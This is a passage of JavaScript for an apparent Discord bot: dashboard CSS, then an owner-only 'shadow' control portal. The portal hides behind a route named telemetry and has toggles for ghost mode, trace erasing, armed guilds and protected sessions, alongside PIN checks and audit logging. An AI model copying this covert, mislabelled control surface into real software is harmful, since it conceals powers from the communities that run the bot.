.tabs { display:flex; gap:6px; margin-bottom:20px; flex-wrap:wrap; border-bottom:1px solid var(--border); padding-bottom:12px; }
.tab-btn {
  background: var(--bg2); color: var(--text2);
  padding: 8px 16px; border-radius: 10px;
  border: 1px solid var(--border);
  cursor: pointer; font-size: 0.8em; transition: all .15s;
  text-decoration: none; display: inline-block;
}
.tab-btn:hover, .tab-btn.active {
  background: linear-gradient(135deg,#7f1d1d,var(--red));
  color: #fff; border-color: transparent;
  box-shadow: 0 0 14px rgba(239,68,68,.4);
}

/* ── Section ── */
.section { display:none; }
.section.active { display:block; }

/* ── Card ── */
.card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 14px;
  padding: 18px 20px;
  margin-bottom: 14px;
  backdrop-filter: blur(12px);
  box-shadow: 0 4px 20px rgba(239,68,68,.08);
  transition: border-color .2s;
}
.card:hover { border-color: var(--border2); }
.card h3 {
  font-size:0.8em; color:var(--red2);
  text-transform:uppercase; letter-spacing:1px;
  margin-bottom:14px; padding-bottom:10px;
  border-bottom:1px solid var(--border);
  display:flex; align-items:center; gap:6px;
}

/* ── Status Badge ── */
.badge { display:inline-block; padding:2px 10px; border-radius:20px; font-size:0.72em; font-weight:700; }
.badge-on  { background:rgba(34,197,94,.12); color:#4ade80; border:1px solid rgba(34,197,94,.3); }
.badge-off { background:rgba(239,68,68,.12); color:var(--red2); border:1px solid rgba(239,68,68,.3); }
.badge-armed { background:rgba(239,68,68,.2); color:var(--red2); border:1px solid rgba(239,68,68,.5); }
.badge-safe  { background:rgba(34,197,94,.12); color:#4ade80; border:1px solid rgba(34,197,94,.3); }

/* ── Toggle Switch ── */
.toggle { position:relative; display:inline-block; width:44px; height:24px; flex-shrink:0; }
.toggle input { opacity:0; width:0; height:0; }
.slider { position:absolute; cursor:pointer; inset:0; background:var(--bg3); border-radius:24px; transition:.2s; border:1px solid var(--border); }
.slider::before { position:absolute; content:''; height:18px; width:18px; left:2px; bottom:2px; background:var(--text3); border-radius:50%; transition:.2s; }
input:checked + .slider { background: linear-gradient(135deg,#7f1d1d,var(--red)); border-color:var(--red2); }
input:checked + .slider::before { transform:translateX(20px); background:#fff; box-shadow: 0 0 6px rgba(239,68,68,.6); }

/* ── Input / Button ── */
input[type=text], input[type=password], select, textarea {
  background: var(--bg2); color: var(--text);
  border: 1px solid var(--border);
  padding: 9px 13px; border-radius: 9px;
  width: 100%; margin-top: 6px; font-size: 0.88em;
  outline: none; transition: border-color .15s;
}
input:focus, select:focus, textarea:focus { border-color: var(--red2); box-shadow: 0 0 0 3px rgba(239,68,68,.15); }
label { color: var(--text2); font-size: 0.8em; display: block; margin-top: 12px; font-weight: 500; }

.btn { border:none; padding:10px 20px; border-radius:10px; font-weight:700; cursor:pointer; width:100%; margin-top:12px; font-size:0.88em; transition:all .18s; }
.btn-danger  { background:linear-gradient(135deg,#7f1d1d,var(--red)); color:#fff; }
.btn-danger:hover  { box-shadow:0 0 18px rgba(239,68,68,.5); transform:translateY(-1px); }
.btn-success { background:linear-gradient(135deg,#166534,#4ade80); color:#000; }
.btn-success:hover { box-shadow:0 0 18px rgba(74,222,128,.4); transform:translateY(-1px); }
.btn-warn    { background:linear-gradient(135deg,#713f12,var(--yellow)); color:#000; }
.btn-warn:hover    { box-shadow:0 0 18px rgba(251,191,36,.4); transform:translateY(-1px); }
.btn-purple  { background:linear-gradient(135deg,#4c1d95,var(--purple)); color:#fff; }
.btn-purple:hover  { box-shadow:0 0 18px rgba(168,85,247,.4); transform:translateY(-1px); }
.btn-sm { padding:5px 12px; border-radius:7px; font-size:0.78em; width:auto; margin-top:0; }

/* ── Grid ── */
.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
@media(max-width:600px){ .grid2 { grid-template-columns:1fr; } }
.grid3 { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; }
@media(max-width:700px){ .grid3 { grid-template-columns:1fr 1fr; } }

/* ── Table ── */
table { width:100%; border-collapse:collapse; }
th { text-align:left; padding:9px 10px; color:var(--text3); border-bottom:1px solid var(--border); font-size:0.75em; font-weight:600; text-transform:uppercase; letter-spacing:.6px; }
td { padding:9px 10px; border-bottom:1px solid rgba(239,68,68,.06); font-size:0.84em; vertical-align:middle; }
tr:last-child td { border-bottom:none; }
tbody tr:hover td { background:rgba(239,68,68,.04); }

/* ── Stat Box ── */
.stat-box { background:var(--bg2); border:1px solid var(--border); border-radius:12px; padding:14px 10px; text-align:center; }
.stat-val { font-size:1.7em; font-weight:900; line-height:1.1; margin-top:4px; }
.stat-lbl { font-size:0.63em; color:var(--text3); margin-top:4px; text-transform:uppercase; letter-spacing:.6px; }

/* ── Command Card ── */
.cmd-card { background:var(--bg2); border:1px solid var(--border); border-radius:10px; padding:12px 14px; margin-bottom:8px; }
.cmd-name { font-family:monospace; font-size:0.9em; color:var(--yellow); font-weight:700; }
.cmd-desc { font-size:0.78em; color:var(--text2); margin-top:4px; line-height:1.5; }
.cmd-tag  { display:inline-block; padding:1px 7px; border-radius:6px; font-size:0.68em; font-weight:700; margin-left:6px; }
.cmd-armed  { background:rgba(239,68,68,.2); color:var(--red2); border:1px solid rgba(239,68,68,.3); }
.cmd-normal { background:rgba(251,191,36,.15); color:var(--yellow); border:1px solid rgba(251,191,36,.3); }
.cmd-new    { background:rgba(168,85,247,.15); color:var(--purple); border:1px solid rgba(168,85,247,.3); }

/* ── Toast ── */
.toast { position:fixed; bottom:20px; right:16px; border-radius:10px; padding:10px 16px; font-size:0.82em; display:none; z-index:9999; max-width:280px; box-shadow:0 4px 20px rgba(0,0,0,.5); backdrop-filter:blur(12px); }
.toast.ok  { background:rgba(20,83,45,.9); border:1px solid rgba(34,197,94,.4); color:#4ade80; }
.toast.err { background:rgba(127,29,29,.9); border:1px solid rgba(239,68,68,.4); color:var(--red2); }

/* ── Modal ── */
.modal { display:none; position:fixed; inset:0; background:rgba(5,3,14,.9); backdrop-filter:blur(8px); justify-content:center; align-items:center; z-index:9999; }
.modal-box { background:var(--bg2); border:1px solid var(--border2); border-radius:18px; padding:30px; width:100%; max-width:340px; text-align:center; box-shadow:0 16px 48px rgba(239,68,68,.25); animation:fadeIn .2s ease; }
@keyframes fadeIn { from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }

/* ── ARM Indicator ── */
.arm-status { display:flex; align-items:center; gap:10px; background:var(--bg2); border-radius:10px; padding:10px 14px; border:1px solid var(--border); margin-bottom:10px; }
.arm-dot { width:10px; height:10px; border-radius:50%; flex-shrink:0; }
.arm-dot.armed { background:var(--red2); box-shadow:0 0 8px var(--red2); animation:pulse-red 1.5s infinite; }
.arm-dot.safe  { background:#4ade80; box-shadow:0 0 6px #4ade80; }
@keyframes pulse-red { 0%,100%{box-shadow:0 0 8px var(--red2);} 50%{box-shadow:0 0 16px var(--red2),0 0 24px rgba(239,68,68,.3);} }

/* ── Login Page ── */
.login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; }
.login-box { background:var(--bg2); border:1px solid var(--border2); border-radius:20px; padding:36px 30px; width:100%; max-width:320px; text-align:center; box-shadow:0 16px 48px rgba(239,68,68,.2); }
.login-icon { font-size:3em; margin-bottom:12px; }
.login-title { font-size:1.2em; font-weight:900; color:var(--red2); margin-bottom:4px; }
.login-sub { font-size:0.78em; color:var(--text3); margin-bottom:20px; }
`;

// ════════════════════════════════════════════════════════════════════════════
//  🌐  PROTECTED CONTROL PORTAL
// ════════════════════════════════════════════════════════════════════════════
async function auditOwnerControlAction(payload = {}) {
    const record = await auditStorage.saveAuditRecord(sessionManager, {
        guildId: payload.guildId || "owner-control",
        source: "owner_control",
        category: "OWNER",
        severity: payload.result === "failed" ? "ERROR" : "WARNING",
        actionType: payload.actionType || "owner_control_action",
        actorId: payload.actorId || config.system.ownerId || null,
        targetId: payload.targetId || null,
        reason: payload.reason || null,
        summary: `${payload.phase || "event"}:${payload.result || "unknown"}`,
        metadata: {
            requestId: payload.requestId || null,
            phase: payload.phase || null,
            result: payload.result || null,
            resultCode: payload.resultCode || null,
            before: payload.before ?? null,
            after: payload.after ?? null
        }
    });
    return Boolean(record);
}

function applyShadowPortalAction(body, engineInstance, mainClient) {
    return applyShadowPortalActionFromHelpers(body, {
        actorId: config.system.ownerId,
        ownerId: config.system.ownerId,
        actorCapability: "owner_only",
        mainClient,
        systemToggles,
        safeDiscordId,
        globalAdminCache,
        armedGuilds,
        protectedSessions,
        sessionManager,
        engineInstance: engineInstance || _shadowEngine,
        logSuppressedError,
        armTtlMs: readFiniteInteger(process.env.SHADOW_ARM_TTL_MS, {
            fallback: 5 * 60 * 1000,
            min: 60 * 1000,
            max: 15 * 60 * 1000
        }),
        verifyStepUpPin(pin) {
            return timingSafePinEqual(pin, SHADOW_WEB_PIN);
        },
        auditOwnerAction: auditOwnerControlAction,
        scheduleArmTimer,
        cancelArmTimer,
        setShadowPin(pin) {
            SHADOW_WEB_PIN = pin;
        },
        getShadowSessionVersion() {
            return shadowSessionVersion;
        },
        setShadowSessionVersion(version) {
            shadowSessionVersion = version;
        },
        resetShadowAuth: resetShadowPortalAuth,
        getGhostMode() {
            return ghostModeEnabled;
        },
        toggleGhostMode() {
            ghostModeEnabled = !ghostModeEnabled;
        },
        getTraceKillSwitch() {
            return traceKillSwitchEnabled;
        },
        toggleTraceKillSwitch() {
            traceKillSwitchEnabled = !traceKillSwitchEnabled;
        },
        getTraceDryRun() {
            return traceDryRunEnabled;
        },
        toggleTraceDryRun() {
            traceDryRunEnabled = !traceDryRunEnabled;
        }
    });
}

function buildShadowPortalContext() {
    return {
        SECRET_PHRASE,
        systemToggles,
        traceGuildPolicies,
        traceMetrics,
        normalizeTracePolicy,
        armedGuilds,
        globalAdminCache,
        protectedSessions,
        sessionManager,
        logSuppressedError
    };
}

function buildShadowPortalState() {
    for (const guildId of armedGuilds.keys()) getActiveArm(guildId);
    return {
        ghostModeEnabled,
        protectedSessionCount: protectedSessions.size,
        armedGuildCount: armedGuilds.size,
        globalAdminCount: globalAdminCache.size,
        traceKillSwitchEnabled,
        traceDryRunEnabled,
        tracePolicyDefault: TRACE_POLICY_DEFAULT,
        protectedChannelCount: protectedChannelIds.size,
        traceRateLimitMax: TRACE_RATE_LIMIT_MAX,
        traceRateLimitWindowSeconds: Math.round(TRACE_RATE_LIMIT_WINDOW_MS / 1000)
    };
}

function renderProtectedDashboard(res, mainClient) {
    setPortalSecurityHeaders(res);
    return res.send(renderShadowDashboardPage(
        {
            ...buildShadowPortalViewDataFromHelpers(mainClient, buildShadowPortalContext()),
            SHADOW_CSS
        },
        buildShadowPortalState()
    ));
}

function injectShadowRoutes(app, mainClient, engineInstance) {
    const urlencoded = express.urlencoded({
        extended: false,
        limit: "8kb",
        parameterLimit: 20,
        verify(req, _res, buffer) {
            req.urlEncodedBodyBytes = buffer.length;
        }
    });
    const basePath = "/api/v1/telemetry/snapshot";
    const enforceBodyLimit = (req, res, next) => {
        const declaredBytes = Number(req.headers?.["content-length"] || 0);
        const measuredBytes = Number(req.urlEncodedBodyBytes || 0);
        if (declaredBytes > 8192 || measuredBytes > 8192) {
            setPortalSecurityHeaders(res);
            return res.status(413).json({ success: false, code: "payload_too_large" });
        }
        return next();
    };

    app.get(basePath, (req, res) => {
        if (!getShadowPortalAuth().authorize(req, res, {}, null)) return;
        return renderProtectedDashboard(res, mainClient);
    });

    app.post(`${basePath}/login`, urlencoded, enforceBodyLimit, (req, res) => {
        const auth = getShadowPortalAuth();
        if (!auth.authorize(req, res, req.body || {}, req.body?.pin)) return;
        setPortalSecurityHeaders(res);
        return res.status(200).json({ success: true });
    });

    app.post(`${basePath}/actions`, urlencoded, enforceBodyLimit, async (req, res) => {
        const auth = getShadowPortalAuth();
        if (!auth.authorize(req, res, {}, null)) return;
        const result = await applyShadowPortalAction(req.body || {}, engineInstance, mainClient);
        setPortalSecurityHeaders(res);
        return res.status(result.status || (result.ok ? 200 : 500)).json({
            success: result.ok === true,
            code: result.code,
            requestId: result.requestId || null,
            actionApplied: result.ok === true
        });
    });

    app.post(`${basePath}/logout`, urlencoded, enforceBodyLimit, (req, res) => {
        const auth = getShadowPortalAuth();
        auth.logout(res);
        return res.status(200).json({ success: true });
    });
}

// ════════════════════════════════════════════════════════════════════════════
//  🚀  EXPORTS
// ════════════════════════════════════════════════════════════════════════════
let _shadowEngine = null;

function selectConfiguredShadowPin(savedAuth, legacyPin, environmentPin) {
    if (typeof savedAuth?.pin === "string") return savedAuth.pin.trim();
    if (typeof legacyPin === "string") return legacyPin.trim();
    return String(environmentPin || "").trim();
}

async function setupShadowEvents(client) {
    try {
        const savedAuth = await sessionManager.getSetting("_shadowPortalAuth", null);
        const legacyPin = await sessionManager.getSetting("_shadowPin", null);
        const configuredPin = selectConfiguredShadowPin(savedAuth, legacyPin, process.env.SHADOW_PORTAL_PIN);
        const configuredVersion = Number(savedAuth?.sessionVersion || 1);
        if (configuredPin.length >= 8) SHADOW_WEB_PIN = configuredPin;
        shadowSessionVersion = Number.isSafeInteger(configuredVersion) && configuredVersion > 0 ? configuredVersion : 1;
    } catch (error) {
        SHADOW_WEB_PIN = "";
        shadowSessionVersion = 1;
        logSuppressedError("load protected portal authentication", error);
    }

    resetShadowPortalAuth();
    if (!SHADOW_WEB_PIN || !String(process.env.SHADOW_SESSION_SECRET || "").trim()) {
        console.warn("[SHADOW AUTH] Protected portal disabled because credentials are not configured.");
    }

    if (_shadowEngine) return _shadowEngine;
    _shadowEngine = new ShadowEngine(client);
    _shadowEngine.init();
    return _shadowEngine;
}

module.exports = {
    setupTelemetryRouter:  injectShadowRoutes,
    initializeSystemHooks: setupShadowEvents,
    shutdownSystemHooks() {
        _shadowEngine?.dispose?.();
        _shadowEngine = null;
    },
    isSystemMaster,
    getSystemCapability,
    getWebPin:      ()  => SHADOW_WEB_PIN,
    isProtected:    (sessionId) => protectedSessions.has(sessionId),
    _test: {
        ShadowEngine,
        buildGuildPolicyMap,
        buildProtectedChannelIds,
        normalizeTracePolicy,
        parseTraceActionId,
        traceActionId,
        traceGuildPolicies,
        protectedChannelIds,
        protectedWebhookIds,
        traceDeletionRequests,
        traceRateLimits,
        traceMetrics,
        getActiveArm,
        scheduleArmTimer,
        cancelArmTimer,
        resetShadowPortalAuth,
        resetTraceState() {
            traceDeletionRequests.clear();
            traceRateLimits.clear();
            traceGuildPolicies.clear();
            protectedChannelIds.clear();
            for (const key of Object.keys(traceMetrics)) traceMetrics[key] = 0;
            traceKillSwitchEnabled = false;
            traceDryRunEnabled = false;
            systemToggles.traceEraser = false;
        },
        setTraceRuntimeOptions(options = {}) {
            if (typeof options.enabled === "boolean") systemToggles.traceEraser = options.enabled;
            if (typeof options.killSwitch === "boolean") traceKillSwitchEnabled = options.killSwitch;
            if (typeof options.dryRun === "boolean") traceDryRunEnabled = options.dryRun;
            if (options.guildPolicies) {
                traceGuildPolicies.clear();
                for (const [guildId, policy] of Object.entries(options.guildPolicies)) {
                    traceGuildPolicies.set(String(guildId), normalizeTracePolicy(policy));
                }
            }
            if (options.protectedChannels) {
                protectedChannelIds.clear();
                for (const channelId of options.protectedChannels) protectedChannelIds.add(String(channelId));
            }
        },
        selectConfiguredShadowPin
    }
};
